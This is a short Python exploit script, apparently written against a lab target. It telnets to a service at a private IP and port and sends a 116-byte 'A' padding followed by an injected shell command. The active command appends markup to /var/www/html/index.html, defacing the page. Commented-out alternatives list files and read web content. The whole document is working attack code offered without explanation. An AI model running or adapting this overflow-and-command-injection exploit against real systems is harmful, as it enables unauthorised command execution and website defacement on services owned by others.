import subprocess
import sys


IP = "192.168.56.101"
#IP = "127.0.0.1"
PORT = 1234
# COMMAND = "pwd"
# COMMAND = "/bin/ls -la #"
#COMMAND = "/bin/cat /var/www/html #"
# COMMAND = "/bin/cat /var/www/html/index.html #"
COMMAND = "echo '<h2>AAAAA</h2>' >> /var/www/html/index.html #"

def attack():
    global IP, PORT, COMMAND

    com = f"telnet {IP} {PORT}"
    print("com: ",com)
    process = subprocess.Popen(com, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=0)
    buffer = "A" * 116 + COMMAND + " \n"
    buffer = buffer.encode()
    process.stdin.write(buffer)
    res = process.stdout.read()
    print(res)


attack()